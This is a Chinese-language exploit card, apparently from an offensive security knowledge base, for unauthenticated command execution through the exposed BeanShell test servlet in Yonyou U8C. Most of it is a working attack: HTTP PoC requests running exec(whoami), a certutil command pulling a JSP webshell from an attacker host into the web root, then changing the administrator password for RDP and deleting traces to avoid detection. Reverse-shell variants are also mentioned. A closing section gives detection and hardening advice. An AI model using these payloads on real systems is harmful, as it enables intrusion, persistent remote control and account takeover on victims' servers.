---
id: web-java-component-yonyou-u8c-bsh-servlet-beanshell-exec
title: 用友 U8C 暴露 BeanShell Servlet：/servlet/~ic/bsh.servlet.BshServlet 未鉴权执行脚本，certutil 拉取 JSP WebShell
type: scenario
domain: web
path: web/java/component
technique: yonyou-u8c-bshservlet-beanshell-rce
aliases:
- 用友 bsh RCE
- BshServlet 命令执行
- bsh.servlet.BshServlet
- 用友 U8C getshell
- BeanShell Test Servlet
- poc-yaml-yonyou-nc-bsh-servlet
tags:
- java
- yonyou
- u8c
- bsh
- beanshell
- rce
- webshell
- unauthenticated
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-17
  verified_at: '2026-11-08T11:24:52+08:00'
  notes: 已对照原文核对：无 CVE 与版本标记，affected_versions 留空正确；图04 BshServlet 2.0b1.1 exec(whoami) 回显 win-06raoh2aq6u\administrator、图06 /1.jsp?cmd=whoami 回显，certutil 落马链有实测支撑；原文 fscan 仅命中 poc-yaml-yonyou-nc-bsh-servlet-bshservlet-rce 指纹名，非 CVE。
---

## 一句话结论

用友 U8C（U8 Cloud）把 BeanShell 的测试 Servlet 暴露在 `/servlet/~ic/bsh.servlet.BshServlet`，页面上的脚本框未做鉴权与沙箱，直接 `Evaluate` 一段 `exec("cmd /c ...")` 就能以应用进程身份执行系统命令；随后用 `certutil -urlcache` 把 JSP 木马下载进 `webapps/u8c_web` 即拿到稳定 WebShell。

## 原理

- **Servlet 本身就是执行器**：`bsh.servlet.BshServlet` 是 BeanShell 自带的调试页面，接收 `bsh.script` 参数、用 `Interpreter.eval()` 求值，并把 `System.out/err` 捕获后输出到「Script Output」。只要该 Servlet 被映射且可从外网访问，等价于给攻击者一个 Java 表达式执行入口。
- **为什么能直接起进程**：BeanShell 脚本运行在 Web 容器 JVM 内，默认可用 `Runtime`/`ProcessBuilder`；`exec("cmd /c ...")` 直接派生 `cmd.exe`，身份即 Tomcat/应用服务账号（原文为 `win-06raoh2aq6u\administrator`，说明服务以管理员运行，危害放大）。
- **为什么能落 WebShell**：Java 进程对自身 web 目录有写权限，或用系统工具 `certutil -f -urlcache -split <url> <本地路径>` 从攻击者机器下载文件；写到 `webapps/u8c_web/` 下即被容器当 JSP 编译执行，比每次走 bsh 更稳定、更适合后续操作。
- **为什么容易被扫到**：该路径固定、页面标题固定（`BeanShell Test Servlet` + `BeanShell version`），fscan 之类的工具已有对应 POC（原文命中 `poc-yaml-yonyou-nc-bsh-servlet-bshservlet-rce`），无需登录即可判定。
- **成因**：产品把调试/测试组件随包发布且未关闭映射，也没有对 `bsh.script` 做任何白名单——本质是「危险调试接口对外暴露」，与具体业务逻辑无关。

## 触发条件

- 目标为用友 U8C/U8 Cloud，8088（或改过的端口）可直接访问，且 `/servlet/~ic/bsh.servlet.BshServlet` 返回 BeanShell 测试页面。
- Servlet 未配置访问控制（未限制内网/未要求认证），`bsh.script` 参数可提交。
- 应用进程可派生进程（未被容器/沙箱/主机策略禁止），且对 webapps 目录有写权限。
- 若仅能执行命令而无写权限，仍可用命令回显完成信息收集，但落 WebShell 需另找可写且有解析权限的目录。

## 利用步骤

1. 端口与指纹：扫描 8088 等端口，访问 `/servlet/~ic/bsh.servlet.BshServlet`，确认页面含 `BeanShell Test Servlet`。
2. 验证执行：在脚本框提交 `exec("whoami")` 并点 Evaluate，观察 Script Output 是否回显身份。
3. 定位 web 根：`exec("cmd /c dir")` 或用 `System.getProperty("user.dir")` 确认 `webapps/u8c_web` 路径。
4. 投递木马：先在自己机器上准备好 JSP，再用 `certutil -f -urlcache -split http://<attacker>/1.jsp webapps/u8c_web/1.jsp` 下载到目标。
5. 访问 `http://target:8088/1.jsp?cmd=whoami` 验证，随后用该 WebShell 做后续操作（原文还用它执行 `net user Administrator <pwd>` 改本机管理员口令，为 RDP 登录铺路）。
6. 清理：如产品日志记录了 bsh 请求，注意请求体特征明显，落地的 JSP 也需要删除以降低被发现的概率。

## PoC

```http
POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
Host: target:8088
Content-Type: application/x-www-form-urlencoded
Content-Length: <len>

bsh.script=exec(%22whoami%22);
```

```http
# 下载 JSP 到 web 根（等价于写 WebShell）
POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
Host: target:8088
Content-Type: application/x-www-form-urlencoded

bsh.script=exec(%22cmd%20/c%20certutil%20-f%20-urlcache%20-split%20http://<attacker>/1.jsp%20webapps/u8c_web/1.jsp%22);
```

```text
GET /1.jsp?cmd=whoami  ->  win-06raoh2aq6u\administrator
```

## 变体与关联

- 变体：不落文件，直接在 bsh 里起反弹 shell / 读配置文件；也可用 `Runtime.getRuntime().exec(new String[]{"cmd","/c",...})` 规避空格与引号问题。
- 变体：同一族产品还有其它调试/管理 Servlet（如 NCCloudGatewayServlet 系列）暴露导致反射调用 RCE，见关联卡。
- 变体：若 bsh 页面被限制为内网访问，可先借 SSRF/代理从内网访问再打。
- 关联：[[web-java-component-yonyou-u8-nccloudgateway-ifiletrans-file-upload]]、[[web-java-component-yonyou-nccloud-gateway-reflection-command-injection]]、[[web-java-deser-yonyou-nc-usersynchronizationservlet]]（同为用友系未授权入口，落点都是 webapps 写 JSP）。
- 边界：补丁删除该 Servlet 映射、网关只放行特定路径、或应用以低权账号运行且 webapps 不可写时，写 WebShell 失败（命令执行仍可能成立）。原文未给出精确版本区间，故不标注 affected_versions。

## 检测与防御

- 检测：任何对 `/servlet/~ic/bsh.servlet.BshServlet` 的访问（正常业务不会调用）；请求体含 `bsh.script`、`exec(`、`Runtime`、`ProcessBuilder`；Java 进程派生 `cmd.exe`/`powershell.exe`/`certutil.exe`；webapps 目录出现新增 JSP 且创建者不是发布流程。
- 修复：升级到厂商修复版本，删除或在 web.xml 中注释掉 `bsh.servlet.BshServlet` 映射；无法删除时在网关/WAF 层直接拒绝该路径与含 `bsh.script` 的请求。
- 加固：应用以最小权限账号运行，webapps 目录对运行账号只读；出网限制（阻断 certutil/curl 到外网），关闭不必要的调试组件；对 `webapps` 与 `WEB-INF` 做文件完整性监控。
- 响应：确认失陷后删除落地 JSP、排查 `net user` 等账号变更、审计 bsh 请求与派生进程时间线，必要时重置本机与应用账号口令。
